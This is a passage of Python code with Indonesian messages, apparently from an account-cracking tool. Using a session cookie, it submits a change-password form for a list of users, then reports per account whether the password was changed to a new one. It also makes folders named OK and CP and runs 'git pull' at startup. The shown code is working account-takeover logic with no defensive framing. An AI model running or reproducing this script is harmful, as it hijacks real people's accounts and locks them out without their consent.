                         'password_confirm':password_new,
                         'save':'Simpan perubahan'
                     }
                     find = parse(link.text,'html.parser').find('form',method='post')['action']
                     posh = ses.post(f'https://{url}' + find, data=data, cookies = {'cookie':coki})
                     if 'Kata Sandi Telah Diubah' in posh.text:
                          print('\r %s*  --> Berhasil mengganti password akun : %s menjadi %s'%(H,user,password_new))
                     else:
                          print('\r %s*  --> Gagal mengganti password akun : %s menjadi %s'%(M,user,password_new))
             except Exception as e:print('\r %s*  --> Gagal mengubah password akun : %s'%(M,user))

def folder():
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.mkdir('data')
    except:pass

if __name__ == "__main__":
	os.system('git pull')
	folder()
	menu()
